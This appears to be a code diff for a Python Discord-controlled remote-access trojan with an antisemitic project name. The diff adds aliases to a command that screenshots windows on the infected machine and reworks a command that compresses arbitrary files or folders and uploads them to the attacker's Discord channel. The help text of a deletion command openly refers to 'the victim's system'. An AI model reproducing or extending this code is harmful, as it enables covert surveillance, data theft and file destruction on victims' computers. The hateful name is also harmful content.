@@ -54,7 +54,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.11.1" # Replace with current JewFuss version, shows in some commands. Compiler looks for this comment for updates, so DO NOT MODIFY THIS COMMENT! - 25c75g
+version = "1.0.11.2" # Replace with current JewFuss version, shows in some commands. Compiler looks for this comment for updates, so DO NOT MODIFY THIS COMMENT! - 25c75g
 USE_TRAY_ICON = False # Enables Tray icon (right click to see version and exit button). DO NOT MODIFY THIS COMMENT! (easy compiler looks for this) | Default: False - 28f93g
 
 starttime = time.perf_counter()
@@ -2110,7 +2110,7 @@ async def winlist(ctx):
     text = "```\n" + "\n".join(out).rstrip() + "\n```"
     await ctx.fm_send(text)
     
-@bot.command(help="Screenshots a window by PID/title/exe and shows cursor if inside.", usage="$ssw <window pid/title/exe>")
+@bot.command(aliases=["winss", "sswin"], help="Screenshots a window by PID/title/exe and shows cursor if inside.", usage="$ssw <window pid/title/exe>")
 async def ssw(ctx, *, match=""):
     match = match.strip()
     if not match:
@@ -2584,23 +2584,30 @@ async def download(ctx, file_path: str = None):
         if not file_path:
             await ctx.send("Error: No file path provided. Please specify the file or folder path to download.")
             return
+
         if not os.path.exists(file_path):
             await ctx.send(f"Error: The path '{file_path}' does not exist.")
             return
 
-        async def compress():
-            tar_filename = os.path.basename(file_path) + ".tar.gz"
-            buffer = io.BytesIO()
-            with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
-                tar.add(file_path, arcname=os.path.basename(file_path))
-            buffer.seek(0)
-            return buffer, tar_filename
+        async def compress_async():
+            def compress():
+                clean_path = file_path.rstrip("\\/")
+                tar_filename = os.path.basename(clean_path) + ".tar.gz"
+                buffer = io.BytesIO()
 
-        buffer, tar_filename = await asyncio.to_thread(compress)
+                with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
+                    tar.add(clean_path, arcname=os.path.basename(clean_path))
+
+                buffer.seek(0)
+                return buffer, tar_filename
+
+            return await asyncio.to_thread(compress)
+
+        buffer, tar_filename = await compress_async()
         await ctx.send(file=discord.File(fp=buffer, filename=tar_filename))
 
     except Exception as e:
-        await ctx.send(f"Error: Could not compress and send the file or folder. {str(e)}")
+        await ctx.send(f"Error: Could not compress and send the file or folder. {e}")
     
 @bot.command(help="Deletes a folder or file from the victim's system", usage="$delete <file>")
 async def delete(ctx, path: str = None):
